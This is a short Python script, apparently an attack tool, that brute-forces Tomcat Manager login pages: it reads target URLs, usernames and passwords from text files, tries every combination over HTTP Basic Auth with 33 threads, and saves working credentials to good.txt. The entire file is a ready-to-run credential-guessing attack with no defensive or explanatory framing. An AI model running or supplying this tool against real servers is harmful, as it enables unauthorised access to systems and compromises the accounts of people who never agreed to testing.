import requests
import base64
from multiprocessing.dummy import Pool as ThreadPool
from datetime import datetime

def weakpass(url, name, passwd):
    headers = {'Authorization': 'Basic %s' % (base64.b64encode((name+':'+passwd).encode())).decode()}
    try:
        r =requests.get(url,headers=headers,timeout=3)
        if r.status_code==200:
            print('[true] ' +url+' '+name+':'+passwd)
            f = open('good.txt','a+')
            f.write(url+' '+name+':'+passwd+' '+datetime.now().strftime('%Y%m%d%H%M%S')+'\n')
            f.close()
        else:
            print('[false] ' + url+' '+name+':'+passwd)
    except:
        print('[false] '  + url+' '+name+':'+passwd)

def get_info():
    urls = [line.strip()+ '/manager/html' for line in open('urls.txt') if line.strip()]
    names = [line.strip() for line in open('name.txt') if line.strip()]
    passwds = [line.strip() for line in open('pass.txt') if line.strip()]
    info = ( (url, name, passwd) for url in urls for name in names for passwd in passwds )
    return info

def good():
    good_ = 0
    for i in open('good.txt').read().split('\n'):
        good_+=1
    print('title "tomcat------good:%s"' % (good_))

def main():
    info = get_info()
    with ThreadPool(33) as pool:
        pool.starmap(weakpass, info)
    good()

if __name__ == "__main__":
    main()
